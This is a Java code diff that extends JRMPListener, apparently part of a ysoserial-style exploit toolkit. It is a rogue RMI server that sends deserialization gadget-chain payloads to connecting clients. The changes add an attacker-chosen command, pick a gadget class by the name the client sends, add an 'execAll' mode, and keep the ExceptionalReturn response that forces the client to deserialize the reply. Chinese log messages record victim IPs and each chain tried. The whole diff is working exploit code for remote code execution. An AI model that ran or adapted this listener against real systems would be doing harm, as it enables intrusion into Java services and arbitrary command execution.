@@ -8,11 +8,14 @@ import javax.management.BadAttributeValueExpException;
 import javax.net.ServerSocketFactory;
 import java.io.*;
 import java.lang.reflect.Field;
+import java.lang.reflect.Method;
 import java.net.*;
 import java.rmi.MarshalException;
 import java.rmi.server.ObjID;
 import java.rmi.server.UID;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 
 
 /**
@@ -35,12 +38,16 @@ public class JRMPListener implements Runnable {
     private boolean exit;
     private boolean hadConnection;
     private URL classpathUrl;
+    private String cmd = "";
+    private String gadgatName = "";
 
 
-    public JRMPListener(int port, Object payloadObject) throws
+    public JRMPListener(int port, Object payloadObject, String cmd , String gadgatName) throws
             NumberFormatException, IOException {
         this.port = port;
         this.payloadObject = payloadObject;
+        this.cmd = cmd;
+        this.gadgatName = gadgatName;
         this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
         System.out.println("Listening on 0.0.0.0:" + port);
 
@@ -110,14 +117,16 @@ public class JRMPListener implements Runnable {
                         s.setSoTimeout(5000);
                         InetSocketAddress remote = (InetSocketAddress)
                                 s.getRemoteSocketAddress();
-                        System.err.println("收到ip:" + remote + "的请求");
+                        System.err.println("收到ip:" + remote.toString().substring(1) + "的请求");
 
                         InputStream is = s.getInputStream();
+
                         InputStream bufIn = is.markSupported() ? is : new
                                 BufferedInputStream(is);
 
                         // Read magic (or HTTP wrapper)
                         bufIn.mark(4);
+
                         DataInputStream in = new DataInputStream(bufIn);
                         int magic = in.readInt();
 
@@ -147,6 +156,7 @@ public class JRMPListener implements Runnable {
                                 out.flush();
                                 in.readUTF();
                                 in.readInt();
+
                             case TransportConstants.SingleOpProtocol:
                                 doMessage(s, in, out, this.payloadObject);
                                 break;
@@ -224,6 +234,8 @@ public class JRMPListener implements Runnable {
                     return ObjID.class;
                 } else if ("java.rmi.server.UID".equals(desc.getName())) {
                     return UID.class;
+                }else if ( "java.lang.String".equals(desc.getName()) ) {
+                    return String.class;
                 }
                 throw new IOException("Not allowed to read object");
             }
@@ -236,20 +248,36 @@ public class JRMPListener implements Runnable {
             throw new MarshalException("unable to read objID", e);
         }
 
+        //------------获取服务名---------------------------
+        ois.readInt(); // method
+        ois.readLong(); // hash
 
-        if (read.hashCode() == 2) {
-            ois.readInt(); // method
-            ois.readLong(); // hash
-            System.err.println("Is DGC call for " + Arrays.toString((ObjID[])
-                    ois.readObject()));
+        String object = (String) ois.readObject();
+        //---------------------------------------
+        try {
+            Class<?> aClass = Class.forName("org.gadget." + object);
+            Object o = aClass.getConstructor().newInstance();
+            Method getObject = Class.forName("org.gadget.inter.Gadget").getMethod("getObject", String.class);
+            getObject.setAccessible(true);
+            Object invoke = getObject.invoke(o, cmd);
+            payload = invoke;
+            System.out.println("尝试利用链："+object);
+        }catch (Exception e){
         }
 
         out.writeByte(TransportConstants.Return);// transport op
         ObjectOutputStream oos = new MarshalOutputStream(out,
                 this.classpathUrl);
 
-        //rmi在接收到返回流时，会readByte，当拿到的值为2时，会进入分支进行反序列化
-        oos.writeByte(TransportConstants.ExceptionalReturn);
+        if(this.gadgatName.equals("execAll")){
+            oos.writeByte(TransportConstants.NormalReturn);
+            this.gadgatName = "null";
+            this.payloadObject = "null";
+        }else {
+            //rmi在接收到返回流时，会readByte，当拿到的值为2时，会进入分支进行反序列化
+            oos.writeByte(TransportConstants.ExceptionalReturn);
+        }
+
         new UID().write(oos);
 
         //
